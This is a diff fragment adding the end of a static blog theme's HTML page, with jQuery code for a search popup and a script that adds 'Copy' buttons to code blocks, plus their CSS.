+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  <style>
+    .copy-btn {
+      display: inline-block;
+      padding: 6px 12px;
+      font-size: 13px;
+      font-weight: 700;
+      line-height: 20px;
+      color: #4D4D4C;
+      white-space: nowrap;
+      vertical-align: middle;
+      cursor: pointer;
+      background-color: #F7F7F7;
+      background-image: linear-gradient(#F7F7F7, #F7F7F7);
+      border: 1px solid #d5d5d5;
+      border-radius: 3px;
+      user-select: none;
+      outline: 0;
+    }
+
+    .highlight-wrap .copy-btn {
+      transition: opacity .3s ease-in-out;
+      opacity: 0;
+      padding: 2px 6px;
+      position: absolute;
+      right: 4px;
+      top: 8px;
+    }
+
+    .highlight-wrap:hover .copy-btn,
+    .highlight-wrap .copy-btn:focus {
+      opacity: 1
+    }
+
+    .highlight-wrap {
+      position: relative;
+    }
+  </style>
+
+  <script>
+    $('.highlight').each(function (i, e) {
+      var $wrap = $('<div>').addClass('highlight-wrap')
+      $(e).after($wrap)
+      $wrap.append($('<button>').addClass('copy-btn').append('Copy').on('click', function (e) {
+        var code = $(this).parent().find('.code').find('.line').map(function (i, e) {
+          return $(e).text()
+        }).toArray().join('\n')
+        var ta = document.createElement('textarea')
+        document.body.appendChild(ta)
+        ta.style.position = 'absolute'
+        ta.style.top = '0px'
+        ta.style.left = '0px'
+        ta.value = code
+        ta.select()
+        ta.focus()
+        var result = document.execCommand('copy')
+        document.body.removeChild(ta)
+        
+          if(result)$(this).text('Copied')
+          else $(this).text('Copy failed')
+        
+        $(this).blur()
+      })).on('mouseleave', function (e) {
+        var $b = $(this).find('.copy-btn')
+        setTimeout(function () {
+          $b.text('Copy')
+        }, 300)
+      }).append(e)
+    })
+  </script>
+
+ 
+</body>
+</html>
